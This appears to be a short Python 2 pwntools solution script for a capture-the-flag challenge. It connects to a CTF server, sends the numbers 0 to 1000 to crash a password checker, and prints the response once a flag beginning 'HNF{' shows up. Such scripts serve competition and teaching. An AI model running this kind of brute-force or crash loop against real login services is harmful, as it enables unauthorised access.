#!/usr/bin/env python2

# imports
from pwn import remote

# connect to server
r = remote("ctf.yadunut.com",8002)
r.recvuntil("flag")

# loop 1001 times to crash the password checker
for i in range(1001):
    r.sendline(str(i))
    response = r.recv(1024) # receive response to see if crashed or not
    if "HNF{" in response:
        print response
        break 

